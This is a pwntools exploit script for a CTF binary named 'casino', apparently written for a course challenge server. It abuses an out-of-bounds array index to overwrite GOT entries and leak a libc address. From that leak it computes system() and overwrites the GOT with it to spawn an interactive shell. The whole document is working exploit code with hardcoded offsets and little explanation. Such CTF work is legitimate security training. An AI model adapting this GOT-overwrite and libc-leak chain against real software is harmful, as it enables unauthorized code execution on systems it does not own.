# .got    0x601ff0
# <puts@GLIBC_2.2.5> 0x602020
#
#
# lottery 0x6020b0
# guess   0x6020d0 
# name    0x6020f0
# seed    0x602100
# age     0x602104
# 
# casino  0x40095d

from pwn import *
import random
context.arch = "amd64"

# elf = ELF('./casino')
# guess = elf.symbols['guess']
# got_puts = elf.got['puts']
# my_shellcode = elf.symbols['name'] + 0x18

guess = 0x6020d0
got_puts = 0x602020
my_seed = 0x601ff0 #libc_start_main

# my_shellcode = name(0x10) + seed(0x04) + age(0x04) + system('sh')'s shellcode
# my_shellcode = '*'*0x20 +"system('/bin/sh')"
# my_shellcode = '*'*0x20 + asm(shellcraft.amd64.linux.sh())
my_shellcode = '*'*0x10 + p64(my_seed)
# print(asm(shellcraft.amd64.linux.sh()))


casino_func_addr = 0x000000000040095d
casino_func_addr_first_half = '00000000'
casino_func_addr_second_half = '0040095d'
#my lottery : 0x61 0x21 0x56 0x1c 0x21 0x2e

io = remote( 'edu-ctf.csie.org' , 10176 )
#io = process('./casino++')
raw_input()
# stop for gdb
    #raw_input()

offset = (got_puts - guess)/4 + 1
io.sendlineafter('Your name: ', my_shellcode)
io.sendlineafter('Your age: ', str(20))

# first try
for i in range(6):
    s = 'the number ' + str(i) + ': '
    io.sendlineafter( s , str(i) )
io.sendlineafter('Change the number? [1:yes 0:no]: ' , str(1))
io.sendlineafter( 'Which number [1 ~ 6]: ', str(offset) )
s = 'Chose the number ' + str(offset) + ': '
casino_addr_int = str(int(casino_func_addr_second_half,16))
io.sendlineafter( ': '  , casino_addr_int )

# second try
# my lottery : 0x21 0x61 0x1c 0x56 0x2e 0x21
# print(str(int('0x21',16)))
lottery_numbers = ['0x3d','0x44','0x20','0x16','0x45','0x14']
for i in range(6):
    io.sendlineafter( ': ' , str(int(lottery_numbers[i],16)))
io.sendlineafter('Change the number? [1:yes 0:no]: ' , str(1))
io.sendlineafter( 'Which number [1 ~ 6]: ', str(offset+1) )

casino_addr_int = str(int(casino_func_addr_first_half,16))
io.sendlineafter( ': ' , casino_addr_int )

#second casino()

printf_at_plt = 0x400700

printf_func_addr = 0x0000000000400700
printf_func_addr_first_half = '00000000'
printf_func_addr_second_half = '00400700'

offset = -35 #srand offset
# first try
for i in range(6):
    s = 'the number ' + str(i) + ': '
    io.sendlineafter( s , str(i) )
io.sendlineafter('Change the number? [1:yes 0:no]: ' , str(1))
io.sendlineafter( 'Which number [1 ~ 6]: ', str(offset) )
s = 'Chose the number ' + str(offset) + ': '
casino_addr_int = str(int(printf_func_addr_second_half,16))
io.sendlineafter( ': '  , casino_addr_int )

# second try
# my lottery : 0x21 0x61 0x1c 0x56 0x2e 0x21
# print(str(int('0x21',16)))
lottery_numbers = ['0x3d','0x44','0x20','0x16','0x45','0x14']
for i in range(6):
    io.sendlineafter( ': ' , str(int(lottery_numbers[i],16)))
io.sendlineafter('Change the number? [1:yes 0:no]: ' , str(1))
io.sendlineafter( 'Which number [1 ~ 6]: ', str(offset+1) )

casino_addr_int = str(int(printf_func_addr_first_half,16))
io.sendlineafter( ': ' , casino_addr_int )

# libc_start_main = 6 bytes
libc_start_main = io.recv(6)
# bcz recv will receive from back end
# and u64 will reverse it
# so add 2 bytes at back end
libc_start_main = libc_start_main + "\0\0"

# readelf -s libc.so | grep libc_start
libc_start_main_offset = 0x0000000000021ab0
libc_start_main = u64(libc_start_main)
libc_base = libc_start_main - libc_start_main_offset

libc_system_offset = 0x000000000004f440
libc_system = libc_base + libc_system_offset

libc_system_last_4_bytes = libc_system % (2147483648*2)
print(hex(libc_system))
print(hex(libc_system_last_4_bytes))

# 0x70~0x73
offset = -29
#offset = 0


for i in range(6):
    s = 'the number ' + str(i) + ': '
    io.sendlineafter( s , str(i) )
io.sendlineafter('Change the number? [1:yes 0:no]: ' , str(1))
io.sendlineafter( 'Which number [1 ~ 6]: ', str(offset) )
s = 'Chose the number ' + str(offset) + ': '
libc_system_last_4_bytes_addr_int = str(libc_system_last_4_bytes)
#io.sendlineafter( ": ", '646545' )

io.sendlineafter( ': '  , libc_system_last_4_bytes_addr_int )
#io.sendlineafter( ': '  , '256')
io.sendlineafter( ': ', "sh" )


io.interactive()



